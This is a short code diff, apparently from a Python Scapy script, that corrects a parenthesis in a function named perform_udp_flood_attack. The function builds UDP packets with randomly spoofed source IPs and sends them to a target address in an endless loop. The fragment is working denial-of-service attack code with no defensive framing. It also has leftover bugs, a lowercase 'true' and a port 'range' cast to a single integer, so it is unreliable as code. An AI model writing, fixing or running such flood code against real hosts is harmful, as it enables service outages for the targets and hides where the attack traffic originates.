@@ -229,7 +229,7 @@ def perform_udp_flood_attack(ip_addr=None, port_range=None):
         # Get input from the user
         port = input("Enter the port range to scan (e.g. 1-1000): ")
 
-    packet = IP(src=RandIP(), dst=ip_addr) / UDP(dport=int(port) / ("X" * RandByte())
+    packet = IP(src=RandIP(), dst=ip_addr) / UDP(dport=int(port)) / ("X" * RandByte())
     while true:
         send(packet)
 
